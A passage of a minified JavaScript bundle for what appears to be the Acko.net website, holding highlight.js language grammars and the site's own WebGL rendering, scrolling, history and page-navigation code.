mat4 mat4x2 mat4x3 mat4x4 mediump noperspective out patch precision readonly restrict return sample sampler1D sampler1DArray sampler1DArrayShadow sampler1DShadow sampler2D sampler2DArray sampler2DArrayShadow sampler2DMS sampler2DMSArray sampler2DRect sampler2DRectShadow sampler2DShadow sampler3D samplerBuffer samplerCube samplerCubeArray samplerCubeArrayShadow samplerCubeShadow smooth struct subroutine switch uimage1D uimage1DArray uimage2D uimage2DArray uimage2DMS uimage2DMSArray uimage2DRect uimage3D uimageBuffer uimageCube uimageCubeArray uint uniform usampler1D usampler1DArray usampler2D usampler2DArray usampler2DMS usampler2DMSArray usampler2DRect usampler3D usamplerBuffer usamplerCube usamplerCubeArray uvec2 uvec3 uvec4 varying vec2 vec3 vec4 void volatile while writeonly",built_in:"gl_BackColor gl_BackLightModelProduct gl_BackLightProduct gl_BackMaterial gl_BackSecondaryColor gl_ClipDistance gl_ClipPlane gl_ClipVertex gl_Color gl_DepthRange gl_EyePlaneQ gl_EyePlaneR gl_EyePlaneS gl_EyePlaneT gl_Fog gl_FogCoord gl_FogFragCoord gl_FragColor gl_FragCoord gl_FragData gl_FragDepth gl_FrontColor gl_FrontFacing gl_FrontLightModelProduct gl_FrontLightProduct gl_FrontMaterial gl_FrontSecondaryColor gl_InstanceID gl_InvocationID gl_Layer gl_LightModel gl_LightSource gl_MaxAtomicCounterBindings gl_MaxAtomicCounterBufferSize gl_MaxClipDistances gl_MaxClipPlanes gl_MaxCombinedAtomicCounterBuffers gl_MaxCombinedAtomicCounters gl_MaxCombinedImageUniforms gl_MaxCombinedImageUnitsAndFragmentOutputs gl_MaxCombinedTextureImageUnits gl_MaxDrawBuffers gl_MaxFragmentAtomicCounterBuffers gl_MaxFragmentAtomicCounters gl_MaxFragmentImageUniforms gl_MaxFragmentInputComponents gl_MaxFragmentUniformComponents gl_MaxFragmentUniformVectors gl_MaxGeometryAtomicCounterBuffers gl_MaxGeometryAtomicCounters gl_MaxGeometryImageUniforms gl_MaxGeometryInputComponents gl_MaxGeometryOutputComponents gl_MaxGeometryOutputVertices gl_MaxGeometryTextureImageUnits gl_MaxGeometryTotalOutputComponents gl_MaxGeometryUniformComponents gl_MaxGeometryVaryingComponents gl_MaxImageSamples gl_MaxImageUnits gl_MaxLights gl_MaxPatchVertices gl_MaxProgramTexelOffset gl_MaxTessControlAtomicCounterBuffers gl_MaxTessControlAtomicCounters gl_MaxTessControlImageUniforms gl_MaxTessControlInputComponents gl_MaxTessControlOutputComponents gl_MaxTessControlTextureImageUnits gl_MaxTessControlTotalOutputComponents gl_MaxTessControlUniformComponents gl_MaxTessEvaluationAtomicCounterBuffers gl_MaxTessEvaluationAtomicCounters gl_MaxTessEvaluationImageUniforms gl_MaxTessEvaluationInputComponents gl_MaxTessEvaluationOutputComponents gl_MaxTessEvaluationTextureImageUnits gl_MaxTessEvaluationUniformComponents gl_MaxTessGenLevel gl_MaxTessPatchComponents gl_MaxTextureCoords gl_MaxTextureImageUnits gl_MaxTextureUnits gl_MaxVaryingComponents gl_MaxVaryingFloats gl_MaxVaryingVectors gl_MaxVertexAtomicCounterBuffers gl_MaxVertexAtomicCounters gl_MaxVertexAttribs gl_MaxVertexImageUniforms gl_MaxVertexOutputComponents gl_MaxVertexTextureImageUnits gl_MaxVertexUniformComponents gl_MaxVertexUniformVectors gl_MaxViewports gl_MinProgramTexelOffsetgl_ModelViewMatrix gl_ModelViewMatrixInverse gl_ModelViewMatrixInverseTranspose gl_ModelViewMatrixTranspose gl_ModelViewProjectionMatrix gl_ModelViewProjectionMatrixInverse gl_ModelViewProjectionMatrixInverseTranspose gl_ModelViewProjectionMatrixTranspose gl_MultiTexCoord0 gl_MultiTexCoord1 gl_MultiTexCoord2 gl_MultiTexCoord3 gl_MultiTexCoord4 gl_MultiTexCoord5 gl_MultiTexCoord6 gl_MultiTexCoord7 gl_Normal gl_NormalMatrix gl_NormalScale gl_ObjectPlaneQ gl_ObjectPlaneR gl_ObjectPlaneS gl_ObjectPlaneT gl_PatchVerticesIn gl_PerVertex gl_Point gl_PointCoord gl_PointSize gl_Position gl_PrimitiveID gl_PrimitiveIDIn gl_ProjectionMatrix gl_ProjectionMatrixInverse gl_ProjectionMatrixInverseTranspose gl_ProjectionMatrixTranspose gl_SampleID gl_SampleMask gl_SampleMaskIn gl_SamplePosition gl_SecondaryColor gl_TessCoord gl_TessLevelInner gl_TessLevelOuter gl_TexCoord gl_TextureEnvColor gl_TextureMatrixInverseTranspose gl_TextureMatrixTranspose gl_Vertex gl_VertexID gl_ViewportIndex gl_in gl_out EmitStreamVertex EmitVertex EndPrimitive EndStreamPrimitive abs acos acosh all any asin asinh atan atanh atomicCounter atomicCounterDecrement atomicCounterIncrement barrier bitCount bitfieldExtract bitfieldInsert bitfieldReverse ceil clamp cos cosh cross dFdx dFdy degrees determinant distance dot equal exp exp2 faceforward findLSB findMSB floatBitsToInt floatBitsToUint floor fma fract frexp ftransform fwidth greaterThan greaterThanEqual imageAtomicAdd imageAtomicAnd imageAtomicCompSwap imageAtomicExchange imageAtomicMax imageAtomicMin imageAtomicOr imageAtomicXor imageLoad imageStore imulExtended intBitsToFloat interpolateAtCentroid interpolateAtOffset interpolateAtSample inverse inversesqrt isinf isnan ldexp length lessThan lessThanEqual log log2 matrixCompMult max memoryBarrier min mix mod modf noise1 noise2 noise3 noise4 normalize not notEqual outerProduct packDouble2x32 packHalf2x16 packSnorm2x16 packSnorm4x8 packUnorm2x16 packUnorm4x8 pow radians reflect refract round roundEven shadow1D shadow1DLod shadow1DProj shadow1DProjLod shadow2D shadow2DLod shadow2DProj shadow2DProjLod sign sin sinh smoothstep sqrt step tan tanh texelFetch texelFetchOffset texture texture1D texture1DLod texture1DProj texture1DProjLod texture2D texture2DLod texture2DProj texture2DProjLod texture3D texture3DLod texture3DProj texture3DProjLod textureCube textureCubeLod textureGather textureGatherOffset textureGatherOffsets textureGrad textureGradOffset textureLod textureLodOffset textureOffset textureProj textureProjGrad textureProjGradOffset textureProjLod textureProjLodOffset textureProjOffset textureQueryLod textureSize transpose trunc uaddCarry uintBitsToFloat umulExtended unpackDouble2x32 unpackHalf2x16 unpackSnorm2x16 unpackSnorm4x8 unpackUnorm2x16 unpackUnorm4x8 usubBorrow gl_TextureMatrix gl_TextureMatrixInverse",
literal:"true false"},i:'"',c:[a.CLCM,a.CBCM,a.CNM,{cN:"preprocessor",b:"#",e:"$"}]}});
hljs.registerLanguage("clojure",function(a){var b={cN:"number",b:"[-+]?\\d+(\\.\\d+)?",r:0},c=a.inherit(a.QSM,{i:null}),e=a.C(";","$",{r:0}),g={cN:"literal",b:/\b(true|false|nil)\b/},f={cN:"collection",b:"[\\[\\{]",e:"[\\]\\}]"},h={cN:"comment",b:"\\^[a-zA-Z_\\-!.?+*=<>&#'][a-zA-Z_\\-!.?+*=<>&#'0-9/;:]*"},k=a.C("\\^\\{","\\}"),p={cN:"attribute",b:"[:][a-zA-Z_\\-!.?+*=<>&#'][a-zA-Z_\\-!.?+*=<>&#'0-9/;:]*"},m={cN:"list",b:"\\(",e:"\\)"},t={eW:!0,r:0},w={k:{built_in:"def defonce cond apply if-not if-let if not not= = < > <= >= == + / * - rem quot neg? pos? delay? symbol? keyword? true? false? integer? empty? coll? list? set? ifn? fn? associative? sequential? sorted? counted? reversible? number? decimal? class? distinct? isa? float? rational? reduced? ratio? odd? even? char? seq? vector? string? map? nil? contains? zero? instance? not-every? not-any? libspec? -> ->> .. . inc compare do dotimes mapcat take remove take-while drop letfn drop-last take-last drop-while while intern condp case reduced cycle split-at split-with repeat replicate iterate range merge zipmap declare line-seq sort comparator sort-by dorun doall nthnext nthrest partition eval doseq await await-for let agent atom send send-off release-pending-sends add-watch mapv filterv remove-watch agent-error restart-agent set-error-handler error-handler set-error-mode! error-mode shutdown-agents quote var fn loop recur throw try monitor-enter monitor-exit defmacro defn defn- macroexpand macroexpand-1 for dosync and or when when-not when-let comp juxt partial sequence memoize constantly complement identity assert peek pop doto proxy defstruct first rest cons defprotocol cast coll deftype defrecord last butlast sigs reify second ffirst fnext nfirst nnext defmulti defmethod meta with-meta ns in-ns create-ns import refer keys select-keys vals key val rseq name namespace promise into transient persistent! conj! assoc! dissoc! pop! disj! use class type num float double short byte boolean bigint biginteger bigdec print-method print-dup throw-if printf format load compile get-in update-in pr pr-on newline flush read slurp read-line subvec with-open memfn time re-find re-groups rand-int rand mod locking assert-valid-fdecl alias resolve ref deref refset swap! reset! set-validator! compare-and-set! alter-meta! reset-meta! commute get-validator alter ref-set ref-history-count ref-min-history ref-max-history ensure sync io! new next conj set! to-array future future-call into-array aset gen-class reduce map filter find empty hash-map hash-set sorted-map sorted-map-by sorted-set sorted-set-by vec vector seq flatten reverse assoc dissoc list disj get union difference intersection extend extend-type extend-protocol int nth delay count concat chunk chunk-buffer chunk-append chunk-first chunk-rest max min dec unchecked-inc-int unchecked-inc unchecked-dec-inc unchecked-dec unchecked-negate unchecked-add-int unchecked-add unchecked-subtract-int unchecked-subtract chunk-next chunk-cons chunked-seq? prn vary-meta lazy-seq spread list* str find-keyword keyword symbol gensym force rationalize"},
l:"[a-zA-Z_\\-!.?+*=<>&#'][a-zA-Z_\\-!.?+*=<>&#'0-9/;:]*",cN:"keyword",b:"[a-zA-Z_\\-!.?+*=<>&#'][a-zA-Z_\\-!.?+*=<>&#'0-9/;:]*",starts:t},q=[m,c,h,k,e,p,f,b,g,{b:"[a-zA-Z_\\-!.?+*=<>&#'][a-zA-Z_\\-!.?+*=<>&#'0-9/;:]*",r:0}];return m.c=[a.C("comment",""),w,t],t.c=q,f.c=q,{aliases:["clj"],i:/\S/,c:[m,c,h,k,e,p,f,b,g]}});
hljs.registerLanguage("coffeescript",function(a){var b={keyword:"in if for while finally new do return else break catch instanceof throw try this switch continue typeof delete debugger super then unless until loop of by when and or is isnt not",literal:"true false null undefined yes no on off",built_in:"npm require console print module global window document"},c={cN:"subst",b:/#\{/,e:/}/,k:b},e=[a.BNM,a.inherit(a.CNM,{starts:{e:"(\\s*/)?",r:0}}),{cN:"string",v:[{b:/'''/,e:/'''/,c:[a.BE]},{b:/'/,e:/'/,
c:[a.BE]},{b:/"""/,e:/"""/,c:[a.BE,c]},{b:/"/,e:/"/,c:[a.BE,c]}]},{cN:"regexp",v:[{b:"///",e:"///",c:[c,a.HCM]},{b:"//[gim]*",r:0},{b:/\/(?![ *])(\\\/|.)*?\/[gim]*(?=\W|$)/}]},{cN:"property",b:"@[A-Za-z$_][0-9A-Za-z$_]*"},{b:"`",e:"`",eB:!0,eE:!0,sL:"javascript"}];c.c=e;var c=a.inherit(a.TM,{b:"[A-Za-z$_][0-9A-Za-z$_]*"}),g={cN:"params",b:"\\([^\\(]",rB:!0,c:[{b:/\(/,e:/\)/,k:b,c:["self"].concat(e)}]};return{aliases:["coffee","cson","iced"],k:b,i:/\/\*/,c:e.concat([a.C("###","###"),a.HCM,{cN:"function",
b:"^\\s*[A-Za-z$_][0-9A-Za-z$_]*\\s*=\\s*(\\(.*\\))?\\s*\\B[-=]>",e:"[-=]>",rB:!0,c:[c,g]},{b:/[:\(,=]\s*/,r:0,c:[{cN:"function",b:"(\\(.*\\))?\\s*\\B[-=]>",e:"[-=]>",rB:!0,c:[g]}]},{cN:"class",bK:"class",e:"$",i:/[:="\[\]]/,c:[{bK:"extends",eW:!0,i:/[:="\[\]]/,c:[c]},c]},{cN:"attribute",b:"[A-Za-z$_][0-9A-Za-z$_]*:",e:":",rB:!0,rE:!0,r:0}])}});
hljs.registerLanguage("json",function(a){var b={literal:"true false null"},c=[a.QSM,a.CNM],e={cN:"value",e:",",eW:!0,eE:!0,c:c,k:b},g={b:"{",e:"}",c:[{cN:"attribute",b:'\\s*"',e:'"\\s*:\\s*',eB:!0,eE:!0,c:[a.BE],i:"\\n",starts:e}],i:"\\S"};a={b:"\\[",e:"\\]",c:[a.inherit(e,{cN:null})],i:"\\S"};return c.splice(c.length,0,g,a),{c:c,k:b,i:"\\S"}});
hljs.registerLanguage("javascript",function(a){return{aliases:["js"],k:{keyword:"in of if for while finally var new function do return void else break catch instanceof with throw case default try this switch continue typeof delete let yield const export super debugger as async await",literal:"true false null undefined NaN Infinity",built_in:"eval isFinite isNaN parseFloat parseInt decodeURI decodeURIComponent encodeURI encodeURIComponent escape unescape Object Function Boolean Error EvalError InternalError RangeError ReferenceError StopIteration SyntaxError TypeError URIError Number Math Date String RegExp Array Float32Array Float64Array Int16Array Int32Array Int8Array Uint16Array Uint32Array Uint8Array Uint8ClampedArray ArrayBuffer DataView JSON Intl arguments require module console window document Symbol Set Map WeakSet WeakMap Proxy Reflect Promise"},
c:[{cN:"pi",r:10,b:/^\s*['"]use (strict|asm)['"]/},a.ASM,a.QSM,{cN:"string",b:"`",e:"`",c:[a.BE,{cN:"subst",b:"\\$\\{",e:"\\}"}]},a.CLCM,a.CBCM,{cN:"number",v:[{b:"\\b(0[bB][01]+)"},{b:"\\b(0[oO][0-7]+)"},{b:a.CNR}],r:0},{b:"("+a.RSR+"|\\b(case|return|throw)\\b)\\s*",k:"return throw case",c:[a.CLCM,a.CBCM,a.RM,{b:/</,e:/>\s*[);\]]/,r:0,sL:"xml"}],r:0},{cN:"function",bK:"function",e:/\{/,eE:!0,c:[a.inherit(a.TM,{b:/[A-Za-z$_][0-9A-Za-z$_]*/}),{cN:"params",b:/\(/,e:/\)/,eB:!0,eE:!0,c:[a.CLCM,a.CBCM]}],
i:/\[|%/},{b:/\$[(.]/},{b:"\\."+a.IR,r:0},{bK:"import",e:"[;$]",k:"import from as",c:[a.ASM,a.QSM]},{cN:"class",bK:"class",e:/[{;=]/,eE:!0,i:/[:"\[\]]/,c:[{bK:"extends"},a.UTM]}],i:/#/}});
hljs.registerLanguage("xml",function(a){var b={b:/<\?(php)?(?!\w)/,e:/\?>/,sL:"php"},c={eW:!0,i:/</,r:0,c:[b,{cN:"attribute",b:"[A-Za-z0-9\\._:-]+",r:0},{b:"=",r:0,c:[{cN:"value",c:[b],v:[{b:/"/,e:/"/},{b:/'/,e:/'/},{b:/[^\s\/>]+/}]}]}]};return{aliases:"html xhtml rss atom xsl plist".split(" "),cI:!0,c:[{cN:"doctype",b:"<!DOCTYPE",e:">",r:10,c:[{b:"\\[",e:"\\]"}]},a.C("\x3c!--","--\x3e",{r:10}),{cN:"cdata",b:"<\\!\\[CDATA\\[",e:"\\]\\]>",r:10},{cN:"tag",b:"<style(?=\\s|>|$)",e:">",k:{title:"style"},
c:[c],starts:{e:"</style>",rE:!0,sL:"css"}},{cN:"tag",b:"<script(?=\\s|>|$)",e:">",k:{title:"script"},c:[c],starts:{e:"\x3c/script>",rE:!0,sL:["actionscript","javascript","handlebars"]}},b,{cN:"pi",b:/<\?\w+/,e:/\?>/,r:10},{cN:"tag",b:"</?",e:"/?>",c:[{cN:"title",b:/[^ \/><\n\t]+/,r:0},c]}]}});window.Acko=window.Acko||{};
var \u03c0=Math.PI,\u03c4=2*\u03c0,rand=function(){var a=0;return function(b){a=b||a;a=a+2127912214+(a<<12)&4294967295;a=(a^3345072700^a>>>19)&4294967295;a=a+374761393+(a<<5)&4294967295;a=(a+3550635116^a<<9)&4294967295;a=a+4251993797+(a<<3)&4294967295;a=(a^3042594569^a>>>16)&4294967295;return(a&268435455)/268435456}}();function pow(a,b){return(0>a?-1:1)*Math.pow(Math.abs(a),b)}function tick(){var a=+new Date;return function(b){var c=+new Date-a;console.log(b,c+" ms");return c}}
var log=function(){var a=0;return function(){500>a++&&console.log.apply(console,arguments)}}(),getStorage=function(a){if(a=localStorage[a])try{a=JSON.parse(a)}catch(b){}if(!a||"object"!=typeof a||a.forEach)a={};return a},setStorage=function(a,b){localStorage[a]=JSON.stringify(b)};Acko.Behaviors=[];Acko.Behaviors.apply=function(a){a=a||document.body;this.forEach(function(b){b(a)})};
var _v=function(a,b,c){return new THREE.Vector3(a,b,c)},forEach=function(a,b){Array.prototype.forEach.call(a,b)},Time=function(){function a(a){b=a.shiftKey}var b=!1,c=1,e=1,g=0,f=+new Date,h=!0;setInterval(function(){h=900<+new Date-f},1E3);requestAnimationFrame(function m(){h=!1;requestAnimationFrame(m);c+=.2*((b?.2:1)-c);e+=.2*(c-e);var a=+new Date;g+=(a-f)*e;f=a});document.addEventListener("keydown",a);document.addEventListener("keyup",a);var k={};return{clock:function(a){a=a||"";void 0==k[a]&&
(k[a]=Time.get());return(Time.get()-k[a])/1E3},getSpeed:function(){return e},isBackground:function(){return h},isSlow:function(){return b},get:function(){return g},absolute:function(){return+new Date/1E3}}}();Acko.Fallback=function(){document.documentElement.classList.add("no-js");document.documentElement.classList.remove("js");var a=window.scroller=new Acko.NativeScroll(0,2E4);a.init();(window.nav=new Acko.Nav("native-frame",a)).updateExtents();Acko.Behaviors.apply(document.body)};
Acko.Fallback.isRequired=function(){var a=navigator.userAgent.match(/Opera/)&&!navigator.userAgent.match(/WebKit/),b=document.createElement("canvas"),c=!!(b&&window.WebGLRenderingContext&&b.getContext("experimental-webgl"));return function(){return a||!c}}();
Acko.Fallback.warnWebGL=function(){if(Acko.Fallback.isRequired()){var a=document.querySelector("#webgl-warning a.close:not(.pinged)");a&&(a.classList.add("pinged"),a.addEventListener("click",function(a){a.preventDefault();Acko.Fallback.dismissWebGL()}));a=document.querySelector("#webgl-warning");a.style.display="block";a.classList.remove("collapsed")}};Acko.Fallback.dismissWebGL=function(){document.querySelector("#webgl-warning").classList.add("collapsed")};var classes=document.documentElement.classList;
classes.add("js");classes.remove("no-js");DomReady.ready(function(){Acko.Fallback.isRequired()?Acko.Fallback():Acko.Main()});
Acko.Main=function(){function a(){requestAnimationFrame(a);q=!1;var b=c.get(),e=!(m&&m.x==b.x&&m.y==b.y),f=p&&(15>Time.clock()||!h.exports.pastMasthead||e||1E-4<Math.abs(h.exports.cameraController.phiT)||h.exports.visualizer.playing||!h.exports.cameraController.bound);m=b;e&&0==b.y?y=setTimeout(function(){h.resize(!0)},500):e&&y&&(clearTimeout(y),y=null);p&&(h.tick(),k.tick());if(f||r||t)k.exports.masthead&&(h.exports.masthead=k.exports.masthead),h.visible(p),h.scroll(b),h.update(),h.exports.ride?
(k.visible(!1),w&&k.update(),w=!1):(k.exports.cameraLerp=h.exports.cameraLerp,k.exports.cameraController=h.exports.cameraController,k.exports.ride=h.exports.ride,k.exports.tracks=h.exports.tracks,k.visible(p),k.scroll(b),w&&k.update(),w=!h.exports.pastMasthead);h.exports.updateStats&&g.update();r=f;t=!1;q=!0}var b="/"==location.pathname,c=new Acko.NativeScroll(0,2E4),e=Acko.Effect.Camera.camera;c.init();var g=window.stats=new Stats;g.domElement.style.position="fixed";g.domElement.style.zIndex=100;
g.domElement.style.display="none";document.body.appendChild(g.domElement);var f={stencil:!1,alpha:!1,antialias:!0};2<=window.devicePixelRatio&&1400<=screen.width&&(f.devicePixelRatio=1);var h=new Acko.Renderer({effects:Acko.Effects,klass:THREE.WebGLRenderer,camera:e,type:"webgl",parameters:f,autoSize:!0,autoRender:!1,dead:!0});h.init();var f=document.getElementById("camera-frame"),k=new Acko.Renderer({effects:Acko.Effects,klass:THREE.CSS3DRenderer,camera:e,type:"css3d",parameters:{cameraElement:f},
dead:!0});k.init();e=new Acko.Nav("native-frame",c,h);e.updateExtents();window.onload=e.updateExtents();h.exports.scrollController=k.exports.scrollController=c;(h.exports.doIntro=b)||0!=c.get().y||c.set(0,h.exports.pageStart-200);window.nav=e;window.gl=h;window.css3d=k;window.scroller=c;Acko.Behaviors.apply(document.body);var p=!0,m=null,t=!1,w=!0,q=!1,y=null,r=!1;window.MathJax&&(p=!1,MathJax.Hub.Queue(function(){p=!0}));window.addEventListener("resize",function(){t=!0});window.addEventListener("focus",
function(){t=!0;h.resize(!0)}.bind(this));window.addEventListener("blur",function(){});requestAnimationFrame(a);window.getIdle=function(){return q}};Acko.Queue=[];Acko.queue=function(a){Acko.Queue.push(a)};Acko.Behaviors.push(function(){Acko.Queue.forEach(function(a){a()});Acko.Queue=[]});
(function(){"scrollRestoration"in history&&(history.scrollRestoration="manual");var a=function(a,b){for(var c,e=[];null!==(c=a.exec(b));)e.push(c);return e},b=function(a){a=a.split("\x3c!-- Begin Content --\x3e");return a[1]&&(a=a[1].split("\x3c!-- End Content --\x3e"))?a[0]:""},c=function(b){return(b=a(/<title[^>]*>((.|\n)*?)<\/title>/gi,b))&&k(b[0][1])||""},e=function(b){var c=[];a(/<video[^>]*>((.|\n)*?)<\/video>/gi,b).forEach(function(a){c.push({source:a[0]})});return c},g=function(b){var c=[];
a(/<img[^>]*>/gi,b).forEach(function(a){c.push({source:a[0]})});return c},f=function(b){var c=[];a(/<iframe[^>]*>((.|\n)*?)<\/iframe>/gi,b).forEach(function(a){c.push({source:a[0]})});return c},h=function(b){var c=[];a(/<script([^>]*)>((.|\n)*?)<\/script>/gi,b).forEach(function(a){var b=a[1],e=a[2],g=b.match(/\s*src=("([^"]*)"|'([^']*)'|([^>]*))/i);if(b=b.match(/\s*type=("([^"]*)"|'([^']*)'|([^>]*))/i))if(b=(b[2]||"")+(b[3]||"")+(b[4]||""),"text/javascript"!=b)return;g?(e=k((g[2]||"")+(g[3]||"")+
(g[4]||"")))&&c.push({source:a[0],url:e}):e&&c.push({source:a[0],local:e})});return c},k=function(a){var b=document.createElement("div");b.innerHTML=a;return b.textContent||b.innerText||a||""},p=function(a,b){var c="translateX("+b+"px) translateZ(0px)";a.style.transform=c;a.style.WebkitTransform=c};Acko.Nav=function(a,b,c){this.container=document.getElementById(a);this.scroll=b;this.gl=c;this.animating=!1;this.warm={};this.warm[location.href]=!0;this.cache={};Acko.History.isSupported()&&(this.history=
new Acko.History(this));this.bind()};Acko.Nav.prototype={bind:function(){var a=function(){this.width=window.innerWidth;this.updateExtents()}.bind(this);this.width=window.innerWidth;window.addEventListener("resize",a);Acko.Behaviors.push(function(a){this.applyBehavior(a)}.bind(this))},updateExtents:function(){var a=0;forEach(this.container.children,function(b){a=Math.max(a,b.offsetHeight)});var b=window.getComputedStyle(this.container),a=a+(this.container.offsetTop+(parseInt(b.paddingTop)||0));this.scroll.extents(0,
a)},applyBehavior:function(a){a=a||this.container;window.MathJax&&MathJax.Hub.Queue(function(){this.updateExtents()}.bind(this));a=a.querySelectorAll("a:not(.nav-link)");forEach(a,function(a){a.classList.add("nav-link");(""+(a.getAttribute("href")||"")).match(/^\/(?!\/)/)&&a.addEventListener("click",function(b){if(!a.classList.contains("history-back")&&!b.ctrlKey&&!b.metaKey&&0===b.button){b.preventDefault();b=a.classList.contains("reverse");var c=window.getComputedStyle(this.container),c=Math.round(this.container.offsetTop+
(parseInt(c.paddingTop)||0)-200);this.navigateTo(a.href,b,c,!0)}}.bind(this))}.bind(this))},navigateTo:function(a,b,c,e,g){this.gl&&this.gl.exports&&(this.gl.exports.cameraController.scnt=0);if(e&&a==location.href)return scroller.scroll(0,c,0,.1);var f=function(f,k,r){e&&this.history&&this.history.push(a,k,c,b);var p=.4*this.width/1E3;"number"==typeof c&&(p=this.scroll.scroll(0,c,p,.1));this.transitionContent(f,p,.1,b,!this.warm[a],function(){this.runScripts(r,function(){this.restoreSources();Acko.Behaviors.apply(this.container);
g&&g()}.bind(this))}.bind(this));this.warm[a]=!0;h||(this.cache[a]={content:f,title:k,scripts:r})}.bind(this),h;(h=this.cache[a])?f(h.content,h.title,h.scripts):microAjax(a,function(a){this.processHTML(a,function(a,b,c){f(a,b,c)}.bind(this))}.bind(this))},processHTML:function(a,k){var p=b(a),q=c(a),y=h(p),r=f(p),z=g(p),C=e(p);y.forEach(function(a){p=p.replace(a.source,"")});r.forEach(function(a){var b=a.source.replace("src=",'src="about:blank" data-src=');p=p.replace(a.source,b)});z.forEach(function(a){var b=
a.source.replace("src=","data-src=");p=p.replace(a.source,b)});C.forEach(function(a){var b=a.source,b=b.replace(/src=/g,"data-src="),b=b.replace(/type=/g,"data-type=");p=p.replace(a.source,b)});k&&k(p,q,y)},transitionContent:function(a,b,c,e,g,f){var h=e?-1:1,k=this.width,B=this.container;e=document.createElement("div");e.innerHTML=a;var D=e.children[0],G=B.children[B.children.length-1];p(D,k*h);g&&D.classList.add("cold");a=D.querySelectorAll("img, iframe, video");forEach(a,function(a){a.classList.add("hide")});
G.style.pointerEvents="none";D.style.pointerEvents="none";B.appendChild(D);var W=function(){var a=Math.max(0,Math.min(1,(Time.clock()-u)/b)),c=.5-.5*Math.cos(a*\u03c0);p(D,k*h*(1-c));p(G,-k*h*c);1>a?requestAnimationFrame(W):setTimeout(function(){B.removeChild(G);g&&D.classList.remove("cold");G.style.pointerEvents="auto";D.style.pointerEvents="auto";f&&f()},33)};this.gl&&(this.gl.frames=-100);this.gl&&this.gl.exports.replace.reset();var u=Time.clock()+(c||0);this.animating=!0;W()},restoreSources:function(){var a=
document.querySelectorAll("iframe, img, video");forEach(a,function(a){function b(){a.classList.add("begin")}var c;(c=a.getAttribute("data-src"))?(a.removeAttribute("data-src"),a.addEventListener("load",function(){setTimeout(b,17);this.updateExtents()}.bind(this)),a.src=c):a.children.length&&(forEach(a.children,function(b){if("SOURCE"==b.tagName){var c=b.getAttribute("data-src");b=b.getAttribute("data-type");a.canPlayType(b)&&(a.src=c)}}.bind(this)),a.addEventListener("progress",function(c){0<a.buffered.length&&
(setTimeout(b,17),this.updateExtents())}.bind(this)));a.classList.add("transition");a.classList.remove("hide")}.bind(this))},runScripts:function(a,b){function c(a){var b=document.createElement("script");b.onload=e;b.src=a;document.body.appendChild(b)}function e(){0==g.length?b&&setTimeout(function(){b()},0):c(g.shift())}var g=[];a.forEach(function(a){a.url&&g.push(a.url);if(a.local)try{eval(a.local)}catch(b){console.error("[Nav]",b)}});0==g.length?b&&b():e()}}})();
(function(){Acko.History=function(a){this.nav=a;this.x=this.depth=0;this.lastState=null;this.bind()};Acko.History.isSupported=function(){return window.history&&window.history.pushState};Acko.History.prototype={bind:function(){this.insert();window.addEventListener("popstate",function(a){this.pop(a.state)}.bind(this));Acko.Behaviors.push(function(a){this.applyBehavior(a)}.bind(this))},pop:function(a){if(a&&a.depth!=this.depth){this.nav.scroll.ignore(1);var b=a.x<this.x;this.x=a.x;this.depth=a.depth;
var c=a.url;a.isError&&(c="http://"+location.host+"/");this.nav.navigateTo(c,b,a.scroll,!1)}},insert:function(){var a,b=document.title;if(a=history.state)this.depth=a.depth||0,this.x=a.x||0,b=a.title;a=location.href;history.replaceState({url:a,depth:this.depth,x:this.x,scroll:this.nav&&(this.nav.scroll.get().y||0),title:b,isError:Acko.History.isErrorPage},b,a)},push:function(a,b,c,e){this.insert();Acko.History.isErrorPage=!1;this.x+=e?-1:1;c={url:a,depth:++this.depth,reverse:e,x:this.x,scroll:c,title:b,
back:history.state&&history.state.title||""};history.pushState(c,b||"",a)},applyBehavior:function(a){a=a||this.container;if(history.state&&0<history.state.depth){a=a.querySelectorAll((history.state.reverse?".next":".prev")+" a:not(.history-back)");var b="";history.state.back&&(b=history.state.back.replace(" \u2014 Acko.net",""),"Hackery, Math & Design"==b&&(b="Home"));forEach(a,function(a){a.classList.add("history-back");""!=b&&(a.querySelector(".caption span").innerHTML=b);a.addEventListener("click",
function(a){a.ctrlKey||a.metaKey||0!==a.button||(a.preventDefault(),history.go(-1))}.bind(this))}.bind(this))}}}})();
(function(){Acko.Scroll=function(a,c){this.x=new Acko.Scroll.Coordinate;this.y=new Acko.Scroll.Coordinate;this.object={x:this.x.value,y:this.y.value};this.extents(a,c)};var a=Acko.Scroll.prototype={init:function(){window.addEventListener("resize",this.resize.bind(this));this.resize()},ignore:function(){},update:function(){this.object={x:this.x.value,y:this.y.value}},get:function(){return this.object},set:function(a,c){this.x.set(a);this.y.set(a);this.update()},scroll:function(a,c,e,g){if(a==this.x.value&&
c==this.y.value)return e;var f=Time.clock()+(g||0);e=Math.max(e,Math.min(1,Math.sqrt(Math.max(Math.abs(this.x.value-a),Math.abs(this.y.value-c))/1500)));var h=this.x.value,k=this.y.value,p=function(){var g=Time.clock();g-f<=e&&requestAnimationFrame(p);g=.5-.5*Math.cos(Math.min(1,Math.max(0,(g-f)/e))*\u03c0);this.set(h+(a-h)*g,k+(c-k)*g)}.bind(this);p();return e},extents:function(a,c){this.pageWidth=a||0;this.pageHeight=c||0;this.adjust()},resize:function(){this.viewWidth=window.innerWidth;this.viewHeight=
window.innerHeight;this.adjust()},adjust:function(){this.x.fit(0,this.pageWidth,this.viewWidth);this.y.fit(0,this.pageHeight,this.viewHeight)}};Acko.Scroll.Coordinate=function(a,c,e,g){this.value=a;this.fit(c,e,g)};Acko.Scroll.Coordinate.prototype={set:function(a){this.value=Math.max(this.min,Math.min(this.max,a||0))},fit:function(a,c,e){this.min=a||0;this.max=Math.max(this.min,(c||0)-(e||0));this.set(this.value)}};Acko.NativeScroll=function(a,c){Acko.Scroll.call(this,a,c);this.ignoreEvents=0};Acko.NativeScroll.prototype=
_.extend(new Acko.Scroll,{init:function(){a.init.call(this);window.addEventListener("scroll",this.onScroll.bind(this));this.onScroll()},ignore:function(a){this.ignoreEvents+=a},set:function(a,c){window.scroll(a,c)},onScroll:function(){this.ignoreEvents&&0<this.ignoreEvents--||(this.x.set(window.scrollX),this.y.set(window.scrollY),this.update())},adjust:function(){a.adjust.call(this);var b=this.pageHeight>this.viewHeight?this.pageHeight+"px":"100%";document.body.style.width=this.pageWidth>this.viewWidth?
this.pageWidth+"px":"100%";document.body.style.height=b}})})();
